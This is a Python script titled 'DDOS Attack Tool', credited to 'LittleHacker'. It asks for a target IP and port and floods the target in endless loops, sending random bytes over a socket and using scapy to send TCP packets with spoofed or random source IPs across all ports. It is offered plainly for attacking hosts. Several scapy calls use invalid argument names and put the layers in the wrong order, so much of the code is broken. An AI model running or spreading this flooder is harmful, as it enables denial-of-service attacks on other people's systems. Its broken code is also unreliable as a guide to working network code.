# DDOS Attack Tool

import colorama
import socket as s
from time import sleep
import random
from scapy.all import *
from scapy import *
from scapy.layers.inet import IP
from scapy.layers.inet import TCP
import random

# COLORS

colorama.init(convert=True)

RED = colorama.Fore.RED
GREEN = colorama.Fore.GREEN
YELLOW = colorama.Fore.YELLOW
CYAN = colorama.Fore.CYAN
WHITE = colorama.Fore.WHITE

def banner():
    print(CYAN + "Author: LittleHacker\nSender Ddanilos DDOS Tool" + WHITE)

def DDOS():
    socket = s.socket(s.AF_INET, s.SOCK_STREAM)
    ######

    bytes = random._urandom(1490)

    ######
    HOST = input("IP: ")
    port = int(input("Port: "))
    print("Sender is clothing up...")
    print("[                    ] 0% ")
    sleep(5)
    print("[=====               ] 25%")
    sleep(5)
    print("[==========          ] 50%")
    sleep(5)
    print("[===============     ] 75%")
    sleep(5)
    print("[====================] 100%")
    sleep(3)
    sentPackets = 0
    while True:
        socket.sendto(bytes, (HOST, port))
        sentPackets += 1 
        port += 1
        print("Sent {} packet to {} through port: {}".format(sentPackets, HOST, port))
        if port == 65534:
            port = 1

def SingleDOS():
    SOURCE_IP = input("Source IP: ")
    TARGET_IP = input("Target IP: ")
    source_port = int(input("Source Port: "))
    i = 1

    while True:
        IP1 = IP(source_ip = SOURCE_IP, destination = TARGET_IP)
        TCP1 = TCP(source_port = source_port, destport = 80)
        packet = TCP1 / IP1
        send(packet, inter = .001)
        print(RED + "Packet sent: {}".format(i))
        i += 1

def multiPORTDOS():
    target_ip = input("Target IP: ")
    source_ip = input("Source IP: ")
    i = 1

    while True:
        for source_port in range(1, 65534):
            IP1 = IP(soucre_ip = source_ip, destination = target_ip)
            TCP1 = TCP(srcport = source_port, destport = 80)
            packet = TCP1 / IP1
            send(packet, inter = .001)

            print(RED + f"Packet sent: {i}")
            i += 1

def multiIPDOS():
    target_ip = input("Target IP: ")
    source_port = int(input("Source Port: "))
    i = 1

    while True:
        a = str(random.randint(1, 254))
        b = str(random.randint(1, 254))
        c = str(random.randint(1, 254))
        d = str(random.randint(1, 254))

        dot = "."

        source_ip = a + dot + b + dot + c + dot + d

        IP1 = IP(source_ip = source_ip, destination = target_ip)
        TCP1 = TCP(sport = source_port, destport = 80)
        packet = TCP1 / IP1
        send(packet, inter = .001)
        print(RED + f"Packet Sent: {i}")
        i += 1

def multiDOS():
    target_ip = input("Target IP: ")
    source_port = int(input("Source Port: "))
    i = 1

    while True:
        a = str(random.randint(1, 254))
        b = str(random.randint(1, 254))
        c = str(random.randint(1, 254))
        d = str(random.randint(1, 254))

        dot = "."

        source_ip = a + dot + b + dot + c + dot + d

        for source_port in range(1, 65534):
            IP1 = IP(soucre_ip = source_ip, destination = target_ip)
            TCP1 = TCP(sport = source_port, destport = 80)
            packet = TCP1 / IP1
            send(packet, inter=.001)
            print(RED + f"Packet Sent: {i}")
            i += 1 